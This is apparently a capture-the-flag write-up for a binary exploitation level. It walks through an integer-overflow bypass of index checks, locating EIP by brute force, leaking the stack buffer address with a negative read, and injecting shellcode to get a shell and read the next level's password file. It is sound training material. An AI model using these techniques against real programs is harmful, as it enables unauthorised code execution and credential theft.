# Level 07

## Initial Context

- One file: `level07`

## Solving the Challenge

The program acts like a database for numbers.

Three commands are available:
- store: store a `value` at an `index`
- read: read a value from an `index`
- quit: exit the program

There is a few restriction on the `store` command:
- the index cannot be divisible by 3
- the index cannot start by `0xb7`

Since integers are stored, the buffer is actually an `int*`, meaning that the index is multiplied by 4 (from `char*` to `int*`).

To store a number divisible by 3, we need to abuse integers overflows.
The unsigned integer max value is `4294967295`, adding one overflows it back to `0`. Since the values are multiplied by 4, we need to divide it.

```bash
(4294967295 + 1) / 4 = 1073741824
```

By offsetting all divisible-by-3 values by `1073741824` will allows us to store values anywhere.

| number | with offset |
| --- | --- |
| 0 | 1073741824 |
| 3 | 1073741827 |
| 6 | 1073741830 |
| 9 | 1073741833 |

By checking the executable security, we know that there is a canary, but the `No eXecute` bit is also disabled.
A shell code is possible.

```bash
$ checksec --file /home/users/level07/level07
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

We can brute-force writing to the stack until we hit `EIP`. The source code is [available here (`cmd_write_and_quit`)](./Ressources/exploit.py).

```bash
$ for index in `seq 1 200`; do
    if ! python /tmp/exploit07.py write-and-quit $index | ./level07 2>&1 >/dev/null; then
        echo -e "index: $index";
    fi;
done
*** stack smashing detected ***:  terminated
Aborted (core dumped)
index: 106
Segmentation fault (core dumped)
index: 114
```

- At index 106, we hit the canary, *this can be ignored.*
- At index 114, we hit EIP.

We also need to know which address to redirect EIP to, for that we need to find the buffer's address.

For that, we can simply use the `read` at index `-9`.

> The buffer is loaded at $esp+0x24. <br />
> Since an integer is 4 bytes, we must divide 0x24 by 4 = 9. <br />
> And since we want to read backward, we must negate it.

```bash
$ ./level07
...
Input command: read
 Index: -9
 Number at data[4294967287] is 4294956404
 Completed read command successfully
```

The buffer is located at `4294956404` or `0xffffd574`.

The code for the payload is [available here (`cmd_payload`)](./Ressources/exploit.py).

```bash
$ python /tmp/exploit07.py payload 4294956404 | ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
whoami
level08
cat /home/users/level08/.pass
<flag>
```
